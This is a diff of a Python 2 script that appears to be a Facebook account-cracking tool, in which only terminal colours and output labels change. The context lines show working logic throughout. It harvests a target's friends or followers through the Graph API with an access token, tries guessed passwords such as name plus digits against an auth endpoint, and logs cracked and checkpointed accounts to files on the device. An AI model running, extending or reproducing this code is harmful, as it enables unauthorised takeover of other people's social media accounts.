@@ -182,7 +182,7 @@ def a_s():
         p2 = raw_input('\033[1;92m[2]Name + digit:')
 	p3 = raw_input('\033[1;92m[3]Name + digit:')
         p4 = raw_input('\033[1;92m[4]Name + digit:')
-        idt = raw_input('\033[1;93m[★]Enter id:')
+        idt = raw_input('\033[1;93m[★]Enter id:\033[1;94m')
         
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -192,7 +192,7 @@ def a_s():
             print logo
             print '\033[1;31;1m~~~~Name pass public cracking~~~~033[1;94m'
             print 47 * '-'
-            print '\033[1;92mCloning from: ' + z
+            print '\033[1;92mCloning from: \033[1;94m' + z
         except (KeyError, IOError):
             print ''
             print '\t Invalid user \x1b[0;97m'
@@ -230,7 +230,7 @@ def a_s():
             print logo
             print '\033[1;31;1m~~~~ Auto pass followers cracking ~~~~\033[1;94m'
 	    print 47 * '-'
-            print '\033[1;92mCloning from: ' + z
+            print '\033[1;92mCloning from: \033[1;94m' + z
         except (KeyError, IOError):
             print ''
             print '\t Invalid user \x1b[0;97m'
@@ -274,7 +274,7 @@ def a_s():
         print '\tChoose valid option' + w
         print ''
         a_s()
-    print ' Total ids: ' + str(len(id))
+    print '\033[1;92mTotal ids: ' + str(len(id))
     time.sleep(0.5)
     print '\033[1;92mCrack Running \033[1;94m'
     time.sleep(0.5)
@@ -289,13 +289,13 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass1
+                print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/jam_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass1
+                print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass1
                 cp = open('/sdcard/ids/jam_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -305,13 +305,13 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass2
+                    print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/jam_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass2
+                    print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass2
                     cp = open('/sdcard/ids/jam_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -321,13 +321,13 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass3
+                        print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass3
                         ok = open('/sdcard/ids/jam_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass3
+                        print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass3
                         cp = open('/sdcard/ids/jam_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -337,13 +337,13 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass4
+                            print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass4
                             ok = open('/sdcard/ids/jam_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass4
+                            print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass4
                             cp = open('/sdcard/ids/jam_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -406,7 +406,7 @@ def c_s():
         pass2 = raw_input('\033[1;92m[2]Password:')
 	pass3 = raw_input('\033[1;92m[3]Password:')
         pass4 = raw_input('\033[1;92m[4]Password:')
-        idt = raw_input('\033[1;93m[★]Enter id:')
+        idt = raw_input('\033[1;93m[★]Enter id:\033[1;94m')
         
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -441,7 +441,7 @@ def c_s():
         pass2 = raw_input('\033[1;92m[2]Password:')
 	pass3 = raw_input('\033[1;92m[3]Password:')
         pass4 = raw_input('\033[1;92m[4]Password:')
-        idt = raw_input('\033[1;93m[★]Enter id:')
+        idt = raw_input('\033[1;93m[★]Enter id:\033[1;94m')
         
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -493,7 +493,7 @@ def c_s():
         print '\t Choose valid option' + w
         print ''
         c_s()
-    print ' Total ids: ' + str(len(id))
+    print '\033[1;92mTotal ids: ' + str(len(id))
     time.sleep(0.5)
     print '\033[1;92mCrack Running\033[1;94m'
     time.sleep(0.5)
@@ -507,13 +507,13 @@ def c_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass1
+                print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/jam_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass1
+                print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass1
                 cp = open('/sdcard/ids/jam_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -522,13 +522,13 @@ def c_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass2
+                    print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/jam_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass2
+                    print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass2
                     cp = open('/sdcard/ids/jam_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -537,13 +537,13 @@ def c_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass3
+                        print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass3
                         ok = open('/sdcard/ids/jam_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass3
+                        print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass3
                         cp = open('/sdcard/ids/jam_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -552,13 +552,13 @@ def c_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass4
+                            print '\033[1;90m[Sani-Ok]➤ ' + uid + ' | ' + pass4
                             ok = open('/sdcard/ids/jam_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\033[1;97m[Sani-Cp] ' + uid + ' | ' + pass4
+                            print '\033[1;97m[Sani-Cp]➤ ' + uid + ' | ' + pass4
                             cp = open('/sdcard/ids/jam_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
